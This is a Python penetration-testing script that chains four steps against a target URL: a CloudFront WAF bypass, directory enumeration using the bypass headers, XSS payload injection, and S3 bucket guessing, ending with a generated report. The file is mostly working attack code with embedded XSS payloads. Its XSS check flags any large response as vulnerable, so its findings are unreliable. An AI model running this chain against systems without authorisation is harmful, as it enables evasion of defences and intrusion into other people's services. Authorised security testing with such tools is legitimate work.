#!/usr/bin/env python3
"""
Full Pentest Chain: Bypass → Enum → Scan → Recon → Report
"""
import os
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from .pierce import WAFPiercer as CloudFrontBypasser


class FullPentestChain:
    def __init__(self, target, output_dir="pentest_results", threads=10):
        self.target = target.rstrip('/')
        self.output_dir = output_dir
        self.threads = threads
        self.bypasses = []
        self.results = {}
        os.makedirs(self.output_dir, exist_ok=True)

    def phase1_bypass(self):
        """Phase 1: WAF Bypass"""
        print(f"[+] Phase 1: WAF Bypass - {self.target}")
        bypasser = CloudFrontBypasser(self.target, self.threads, 0.2)
        all_results = bypasser.scan()
        self.bypasses = [r for r in all_results if r.get('bypass')]
        json.dump(self.bypasses, open(f"{self.output_dir}/bypasses.json", 'w'), indent=2)
        print(f"    Found {len(self.bypasses)} bypasses")

    def phase2_enum(self):
        """Phase 2: Directory Enumeration"""
        print("[+] Phase 2: Directory Enumeration")
        with open("wordlists/dirs.txt") as f:
            wordlist = [line.strip() for line in f]
        
        def test_path(path):
            for bypass in self.bypasses[:5]:
                headers = bypass.get('headers', {})
                try:
                    resp = requests.get(urljoin(self.target, path), headers=headers, timeout=5)
                    if resp.status_code == 200:
                        return {'path': path, 'headers': headers, 'size': len(resp.content)}
                except:
                    pass
            return None
        
        live_paths = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_path, path) for path in wordlist]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    live_paths.append(result)
                    print(f"    LIVE: {result['path']}")
        
        self.results['live_paths'] = live_paths
        json.dump(live_paths, open(f"{self.output_dir}/live_paths.json", 'w'), indent=2)

    def phase3_scan(self):
        """Phase 3: Vulnerability Scan"""
        print("[+] Phase 3: Vulnerability Scanning")
        xss_payloads = ["<svg onload=alert(1)>", "javascript:alert(document.cookie)"]
        vuln_findings = []
        
        for path_data in self.results.get('live_paths', self.bypasses):
            path = path_data.get('path', '/')
            headers = path_data.get('headers', {})
            for payload in xss_payloads:
                test_url = f"{self.target}{path}?test={payload}"
                try:
                    resp = requests.get(test_url, headers=headers, timeout=5)
                    if 'alert' in resp.text.lower() or len(resp.content) > 10000:
                        vuln_findings.append({'type': 'XSS', 'url': test_url, 'payload': payload})
                except:
                    pass
        
        self.results['vulns'] = vuln_findings
        json.dump(vuln_findings, open(f"{self.output_dir}/vulns.json", 'w'), indent=2)
        print(f"    Found {len(vuln_findings)} vulns")

    def phase4_recon(self):
        """Phase 4: AWS Recon"""
        print("[+] Phase 4: AWS Recon")
        s3_buckets = []
        domain = urlparse(self.target).netloc.replace('.cloudfront.net', '')
        bucket_guesses = [f"{domain}-{suffix}" for suffix in ['prod', 'staging', 'backup', 'assets']]
        
        for bucket in bucket_guesses:
            try:
                resp = requests.head(f"https://s3.amazonaws.com/{bucket}/", timeout=5)
                if resp.status_code in [403, 200]:
                    s3_buckets.append(bucket)
            except:
                pass
        
        self.results['aws'] = {'s3_buckets': s3_buckets}
        json.dump(s3_buckets, open(f"{self.output_dir}/s3_enum.json", 'w'), indent=2)
        print(f"    Found {len(s3_buckets)} S3 buckets")

    def phase5_report(self):
        """Phase 5: Generate Report"""
        print("[+] Phase 5: Report Generation")
        vulns = self.results.get('vulns', [])
        s3 = self.results.get('aws', {}).get('s3_buckets', [])
        
        report = f"""# WAFPierce Report: {self.target}

## Summary
| Metric | Count |
|--------|-------|
| Bypasses | {len(self.bypasses)} |
| Live Paths | {len(self.results.get('live_paths', []))} |
| XSS Vulns | {len(vulns)} |
| S3 Buckets | {len(s3)} |

## Critical Bypasses
```json
{json.dumps(self.bypasses[:3], indent=2)}
```

## Vulnerabilities
{vulns[0]['url'] if vulns else 'None detected'}

## Remediation
- WAF: Block %u003c, jaVasCript, X-Forwarded-For:127.0.0.1
- Origin: Sanitize test parameter
- S3: Fix {s3[0] if s3 else "N/A"} bucket ACLs
- Risk: CVSS 7.5+ (WAF Bypass + XSS)
"""
        
        with open(f"{self.output_dir}/REPORT.md", 'w') as f:
            f.write(report)
        print("    Report saved")

    def run(self):
        """Execute full chain"""
        phases = [
            self.phase1_bypass,
            self.phase2_enum,
            self.phase3_scan,
            self.phase4_recon,
            self.phase5_report
        ]
        for phase in phases:
            phase()
        print(f"\n[+] COMPLETE: {self.output_dir}/REPORT.md ready!")


def main():
    from argparse import ArgumentParser
    
    parser = ArgumentParser()
    parser.add_argument("target", help="Target URL (e.g., https://example.cloudfront.net)")
    parser.add_argument("-o", "--output", default="pentest_results", help="Output directory")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    args = parser.parse_args()
    
    FullPentestChain(args.target, args.output, args.threads).run()


if __name__ == "__main__":
    main()